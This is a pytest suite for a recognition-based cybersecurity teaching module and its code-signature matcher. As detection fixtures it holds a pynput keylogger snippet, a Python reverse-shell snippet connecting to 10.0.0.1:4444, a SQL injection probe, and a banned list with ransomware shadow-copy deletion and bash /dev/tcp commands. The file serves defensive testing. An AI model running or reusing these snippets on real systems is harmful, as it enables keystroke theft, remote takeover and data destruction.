"""
Cybersecurity taught by recognition, safely.

  "there must be key identifiers that teach me PROPERLY ... so then if I look at
   a piece of code in the future from a keylogger or a rootkit then I'll
   identify that ... solely for educational purposes ... with drawbacks so it
   doesn't harm other systems."

The deliverable the request is really about is RECOGNITION — being able to look
at unfamiliar code and know what it is. So every lesson leads with identifiers,
the dangerous categories are taught by recognition ONLY (no working malware),
and there is a matcher that names the technique a snippet resembles and says
what gave it away.

These tests lock in the safety posture as much as the content: no lesson may
ship deployable attack code for a malware category, and every lesson must point
somewhere lawful to practise.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from orion_core import cyber_teaching as ct  # noqa: E402
from orion_core.cyber_teaching import Category, DemoPolicy, LESSONS  # noqa: E402


# ── the lessons exist and are recognition-first ──────────────────────────────

def test_the_core_techniques_are_covered():
    for topic in ("keylogger", "rootkit", "sql_injection", "xss",
                  "reverse_shell", "port_scanning", "privilege_escalation",
                  "phishing", "ransomware"):
        assert topic in LESSONS, topic


def test_every_lesson_leads_with_identifiers():
    """The whole point: recognising the technique in the wild."""
    for topic, lesson in LESSONS.items():
        assert lesson.identifiers, f"{topic} has no identifiers"
        assert len(lesson.identifiers) >= 3, f"{topic} needs more identifiers"


def test_every_lesson_points_to_a_lawful_place_to_practise():
    for topic, lesson in LESSONS.items():
        assert lesson.practice, f"{topic} has no practice range"


def test_every_lesson_renders_cleanly():
    for topic in LESSONS:
        text = ct.teach(topic)
        assert "Key identifiers" in text
        assert "practise" in text.lower() or "recognition" in text.lower()


# ── the safety posture, asserted ─────────────────────────────────────────────

def test_dangerous_categories_are_recognition_only():
    """A rootkit / ransomware / keylogger lesson must never be a build guide."""
    for topic in ("rootkit", "ransomware", "keylogger"):
        assert LESSONS[topic].demo_policy is DemoPolicy.CONCEPT_ONLY, topic


def test_recognition_only_lessons_say_so_in_the_text():
    for topic in ("rootkit", "ransomware"):
        text = ct.teach(topic).lower()
        assert "recognition only" in text or "recognise" in text
        assert "no working" in text or "concept" in text or "no runnable" in text


def test_web_vulns_are_safe_to_practise_hands_on():
    """SQLi/XSS are practised on deliberately-vulnerable targets, so they may be
    hands-on — but only there."""
    assert LESSONS["sql_injection"].demo_policy is DemoPolicy.SAFE_LAB
    assert LESSONS["xss"].demo_policy is DemoPolicy.SAFE_LAB
    assert any("PortSwigger" in p or "DVWA" in p or "Juice" in p
               for p in LESSONS["sql_injection"].practice)


def test_no_lesson_ships_a_working_attack_payload():
    """Recognition, not weapons: the lesson bodies teach signatures and fixes,
    not runnable exploits. Guard against a plausible copy-paste payload."""
    banned = [
        "vssadmin delete shadows /all",       # ransomware action
        "bash -i >& /dev/tcp",                 # a pasteable reverse shell
    ]
    for topic, lesson in LESSONS.items():
        body = " ".join(lesson.how_it_works + lesson.safeguards).lower()
        for phrase in banned:
            assert phrase not in body, f"{topic} contains a usable payload: {phrase}"


def test_every_lesson_has_safeguards_or_a_recognition_stance():
    for topic, lesson in LESSONS.items():
        assert lesson.safeguards, f"{topic} has no safeguards/stance"


# ── topic resolution ─────────────────────────────────────────────────────────

@pytest.mark.parametrize("query,expected", [
    ("keylogger", "keylogger"),
    ("key logger", "keylogger"),
    ("sqli", "sql_injection"),
    ("sql injection", "sql_injection"),
    ("nmap", "port_scanning"),
    ("how does a reverse shell work", "reverse_shell"),
    ("privesc", "privilege_escalation"),
    ("cross-site scripting", "xss"),
])
def test_topics_resolve_from_natural_phrasing(query, expected):
    assert ct.resolve_topic(query) == expected


def test_an_unknown_topic_lists_the_catalogue():
    out = ct.teach("quantum teleportation")
    assert "don't have a dedicated lesson" in out
    assert "Keyloggers" in out or "SQL Injection" in out


# ── the identifier / code matcher ────────────────────────────────────────────

def test_it_identifies_a_keylogger_snippet():
    code = ("from pynput import keyboard\n"
            "def on_press(key): open('log.txt','a').write(str(key))\n"
            "keyboard.Listener(on_press=on_press).start()")
    hits = dict(ct.identify(code))
    assert "keylogger" in hits


def test_it_identifies_a_reverse_shell_snippet():
    code = ("import socket,subprocess,os\n"
            "s=socket.socket(); s.connect(('10.0.0.1',4444))\n"
            "os.dup2(s.fileno(),0)")
    hits = dict(ct.identify(code))
    assert "reverse_shell" in hits


def test_it_identifies_sql_injection():
    hits = dict(ct.identify("query = \"SELECT * FROM users WHERE name='\" + user + \"'\"\n"
                            "# probe: ' OR '1'='1"))
    assert "sql_injection" in hits


def test_the_report_says_what_gave_it_away():
    report = ct.identify_report("from pynput import keyboard\nkeyboard.on_press(cb)")
    assert "Keylogger" in report
    assert "matched" in report
    assert "pynput" in report


def test_innocuous_code_is_not_flagged():
    hits = ct.identify("def add(a, b):\n    return a + b")
    assert hits == []


def test_empty_input_is_handled():
    assert ct.identify("") == []
    assert "Nothing" in ct.identify_report("   ")


def test_identify_never_claims_safety():
    """A non-match is 'no known signature', not 'safe' — over-claiming would
    teach the wrong lesson."""
    report = ct.identify_report("print('hello')")
    assert "not proof" in report.lower() or "does not trip" in report.lower()


# ── the tool ─────────────────────────────────────────────────────────────────

def test_the_cyber_tool_routes_teach_and_identify():
    import inspect

    from orion_core.dispatch_knowledge import KnowledgeDispatchMixin

    source = inspect.getsource(KnowledgeDispatchMixin.cyber_curriculum_tool)
    assert '"teach"' in source
    assert '"identify"' in source
    assert "cyber_teaching" in source


def test_the_schema_advertises_teaching():
    from orion_core.dispatch_schema import TOOL_DECLARATIONS

    tool = next(t for t in TOOL_DECLARATIONS if t["name"] == "cyber_curriculum")
    assert "teach" in tool["description"]
    assert "identifiers" in tool["description"].lower()
    assert "topic" in tool["parameters"]["properties"]
    assert "code" in tool["parameters"]["properties"]
